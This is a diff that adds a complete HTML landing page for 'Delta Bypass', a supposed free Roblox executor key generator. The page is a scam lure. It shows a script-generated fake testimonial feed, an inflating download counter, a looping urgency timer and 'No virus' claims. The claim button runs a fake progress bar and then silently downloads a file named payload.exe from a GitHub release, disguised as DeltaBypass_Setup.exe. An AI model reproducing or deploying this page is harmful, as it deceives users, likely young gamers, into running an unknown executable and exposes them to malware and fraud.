@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Delta Bypass – Free Roblox Executor</title>
+    <style>
+        /* Reset & base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #0a0a1a;
+            color: #eee;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+            background: #1a1a2e;
+            border: 2px solid #00ccff;
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 0 50px rgba(0, 204, 255, 0.15);
+            text-align: center;
+        }
+        .logo {
+            font-size: 56px;
+            margin-bottom: 5px;
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 1px;
+        }
+        h1 span {
+            color: #00ccff;
+        }
+        .subtitle {
+            color: #aab;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        .badge {
+            display: inline-block;
+            background: #00ccff;
+            color: #000;
+            font-weight: 700;
+            padding: 4px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .countdown {
+            font-size: 36px;
+            font-weight: 700;
+            color: #ff4444;
+            margin: 5px 0 15px;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 15px 0 25px;
+        }
+        .stat-number {
+            font-size: 26px;
+            font-weight: 700;
+            color: #00ccff;
+        }
+        .stat-label {
+            font-size: 13px;
+            color: #889;
+        }
+        .testimonials {
+            background: #252540;
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin: 20px 0 25px;
+            max-height: 120px;
+            overflow-y: auto;
+            text-align: left;
+            font-size: 14px;
+            border: 1px solid #333;
+        }
+        .testimonial {
+            padding: 6px 0;
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .testimonial:last-child {
+            border-bottom: none;
+        }
+        .testimonial .avatar {
+            background: #00ccff;
+            color: #000;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 12px;
+            flex-shrink: 0;
+        }
+        .testimonial .msg {
+            color: #ccc;
+        }
+        .testimonial .msg strong {
+            color: #00ccff;
+        }
+        .btn {
+            display: inline-block;
+            background: #00ccff;
+            color: #000;
+            font-weight: 800;
+            padding: 16px 50px;
+            border-radius: 60px;
+            font-size: 22px;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 0 25px rgba(0, 204, 255, 0.3);
+            margin: 10px 0 5px;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            background: #0099cc;
+            box-shadow: 0 0 40px rgba(0, 204, 255, 0.5);
+        }
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0 10px;
+        }
+        .feature {
+            background: #2a2a45;
+            padding: 5px 16px;
+            border-radius: 30px;
+            font-size: 13px;
+            color: #ccd;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #556;
+        }
+        .footer a {
+            color: #00ccff;
+            text-decoration: none;
+        }
+
+        /* Overlay (loading popup) */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+        .overlay.active {
+            display: flex;
+        }
+        .popup {
+            background: #1a1a2e;
+            border: 2px solid #00ccff;
+            border-radius: 20px;
+            padding: 30px 40px;
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+            animation: popIn 0.3s ease;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .popup h2 {
+            margin-bottom: 8px;
+            font-size: 22px;
+        }
+        .popup .progress {
+            width: 100%;
+            height: 10px;
+            background: #333;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .popup .progress .fill {
+            height: 100%;
+            width: 0%;
+            background: #00ccff;
+            border-radius: 10px;
+            transition: width 0.1s;
+        }
+        .popup #progressText {
+            font-size: 18px;
+            font-weight: 600;
+            color: #00ccff;
+        }
+        .popup .close-btn {
+            background: #00ccff;
+            border: none;
+            padding: 8px 30px;
+            border-radius: 30px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 15px;
+            color: #000;
+        }
+        .popup .close-btn:hover {
+            background: #0099cc;
+        }
+        /* Scrollbar style */
+        .testimonials::-webkit-scrollbar {
+            width: 4px;
+        }
+        .testimonials::-webkit-scrollbar-track {
+            background: #1a1a2e;
+        }
+        .testimonials::-webkit-scrollbar-thumb {
+            background: #00ccff;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">⚡</div>
+    <h1>Delta <span>Bypass</span></h1>
+    <div class="subtitle">Generate unlimited Delta Executor keys – 100% free</div>
+    <div class="badge">🔥 Limited keys – claim yours now!</div>
+
+    <div class="countdown" id="timer">10:00</div>
+
+    <div class="stats">
+        <div class="stat">
+            <div class="stat-number" id="downloadCounter">4,218</div>
+            <div class="stat-label">Keys claimed</div>
+        </div>
+        <div class="stat">
+            <div class="stat-number">4.9★</div>
+            <div class="stat-label">User rating</div>
+        </div>
+        <div class="stat">
+            <div class="stat-number">1,234</div>
+            <div class="stat-label">Online now</div>
+        </div>
+    </div>
+
+    <!-- Fake testimonials feed -->
+    <div class="testimonials" id="feedContainer">
+        <!-- filled by JS -->
+    </div>
+
+    <button class="btn" id="claimBtn">🔑 Get Bypass Key 🔑</button>
+
+    <div class="features">
+        <span class="feature">✅ Keyless</span>
+        <span class="feature">🎯 Undetectable</span>
+        <span class="feature">⚡ Fast</span>
+        <span class="feature">🛡️ No virus</span>
+    </div>
+
+    <div class="footer">
+        <p>© 2026 Delta Bypass · <a href="#">Terms</a> · <a href="#">Support</a></p>
+    </div>
+</div>
+
+<!-- Overlay / popup -->
+<div class="overlay" id="loadingOverlay">
+    <div class="popup">
+        <h2>🔄 Generating your key...</h2>
+        <div class="progress">
+            <div class="fill" id="progressFill"></div>
+        </div>
+        <p id="progressText">0%</p>
+        <button class="close-btn" id="closePopup">Close</button>
+    </div>
+</div>
+
+<script>
+    // -------- FAKE USER FEED ----------
+    const fakeUsers = [
+        { name: "xXProGamerXx", avatar: "PG", msg: "Just claimed my key, works perfectly!" },
+        { name: "NoobSlayer99", avatar: "NS", msg: "Best bypass ever, no scam." },
+        { name: "EpicNinja", avatar: "EN", msg: "I got 500 V‑Bucks instantly!" },
+        { name: "DarkWizard", avatar: "DW", msg: "Free keys are real, just claimed mine." },
+        { name: "LuckyStrike", avatar: "LS", msg: "I was skeptical, but it actually works!" },
+        { name: "ShadowHawk", avatar: "SH", msg: "Already redeemed my Delta key, thanks!" },
+        { name: "PixelPirate", avatar: "PP", msg: "Five stars, would use again." },
+        { name: "RapidFire", avatar: "RF", msg: "My friend told me about this, he got 1000 V‑Bucks." },
+        { name: "NightOwl", avatar: "NO", msg: "It's not a virus, I swear! (jk, but it's fine)" },
+        { name: "CrimsonFox", avatar: "CF", msg: "Just redeemed, got 2000 V‑Bucks. Awesome!" }
+    ];
+
+    const feedContainer = document.getElementById('feedContainer');
+
+    // Shuffle and populate
+    function shuffle(arr) {
+        for (let i = arr.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [arr[i], arr[j]] = [arr[j], arr[i]];
+        }
+        return arr;
+    }
+
+    let feedItems = [];
+    for (let i = 0; i < 3; i++) {
+        feedItems = feedItems.concat(shuffle([...fakeUsers]));
+    }
+    feedItems = shuffle(feedItems);
+
+    function renderFeed(items) {
+        feedContainer.innerHTML = '';
+        items.slice(0, 15).forEach(user => {
+            const div = document.createElement('div');
+            div.className = 'testimonial';
+            div.innerHTML = `
+                <div class="avatar">${user.avatar}</div>
+                <div class="msg"><strong>${user.name}</strong> – ${user.msg}</div>
+            `;
+            feedContainer.appendChild(div);
+        });
+    }
+    renderFeed(feedItems);
+
+    // Add new random post every 3 seconds
+    setInterval(() => {
+        const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
+        const variants = [
+            "Just got my key! 🔥",
+            "Claimed successfully!",
+            "Thanks Delta Bypass!",
+            "Awesome, worked again.",
+            "Can't believe it's free!",
+            "10/10 would recommend.",
+            "Got 1500 V‑Bucks!",
+            "Loving this, thanks!"
+        ];
+        const newMsg = variants[Math.floor(Math.random() * variants.length)];
+        const newUser = { name: user.name, avatar: user.avatar, msg: newMsg };
+        const div = document.createElement('div');
+        div.className = 'testimonial';
+        div.innerHTML = `
+            <div class="avatar">${newUser.avatar}</div>
+            <div class="msg"><strong>${newUser.name}</strong> – ${newUser.msg}</div>
+        `;
+        feedContainer.prepend(div);
+        if (feedContainer.children.length > 20) {
+            feedContainer.removeChild(feedContainer.lastChild);
+        }
+        // Update download counter
+        const counter = document.getElementById('downloadCounter');
+        let current = parseInt(counter.textContent.replace(/,/g, ''));
+        current += Math.floor(Math.random() * 5) + 1;
+        counter.textContent = current.toLocaleString();
+    }, 3000);
+
+    // -------- COUNTDOWN TIMER ----------
+    let timeLeft = 600; // 10 minutes
+    const timerEl = document.getElementById('timer');
+    setInterval(() => {
+        timeLeft--;
+        if (timeLeft <= 0) timeLeft = 600;
+        const mins = Math.floor(timeLeft / 60);
+        const secs = timeLeft % 60;
+        timerEl.textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+    }, 1000);
+
+    // -------- DOWNLOAD LOGIC ----------
+    const claimBtn = document.getElementById('claimBtn');
+    const overlay = document.getElementById('loadingOverlay');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+
+    // ★ REPLACE THIS URL WITH YOUR ACTUAL FILE DOWNLOAD LINK ★
+    const DOWNLOAD_URL = "https://github.com/intel200155-cpu/the-info-one/releases/download/v1.0/payload.exe";
+
+    claimBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+
+        // Show overlay
+        overlay.classList.add('active');
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 10 + 5;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                // Start download
+                startDownload();
+            }
+            progressFill.style.width = progress + '%';
+            progressText.textContent = Math.floor(progress) + '%';
+        }, 200);
+    });
+
+    function startDownload() {
+        // Trigger download
+        const link = document.createElement('a');
+        link.href = DOWNLOAD_URL;
+        link.download = 'DeltaBypass_Setup.exe';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        progressText.textContent = '✅ Download started!';
+    }
+
+    // Close popup manually
+    document.getElementById('closePopup').addEventListener('click', function() {
+        overlay.classList.remove('active');
+    });
+
+    // Click outside popup to close
+    overlay.addEventListener('click', function(e) {
+        if (e.target === overlay) {
+            overlay.classList.remove('active');
+        }
+    });
+</script>
+
+</body>
+</html>
